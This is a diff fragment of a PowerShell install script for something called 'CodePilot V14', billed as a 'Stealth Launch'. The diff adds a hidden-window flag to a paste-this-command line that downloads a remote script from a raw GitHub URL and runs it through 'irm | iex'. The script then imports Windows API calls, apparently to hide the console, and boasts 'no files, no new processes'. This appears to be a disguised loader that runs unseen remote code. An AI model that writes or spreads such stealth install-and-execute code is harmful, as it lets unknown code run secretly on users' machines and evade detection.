@@ -1,5 +1,5 @@
 # CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
-# Usage: powershell -c "irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex"
+# Usage: powershell -W Hidden -C "irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex"
 # Hide the console window — no files, no new processes
 try {
     Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
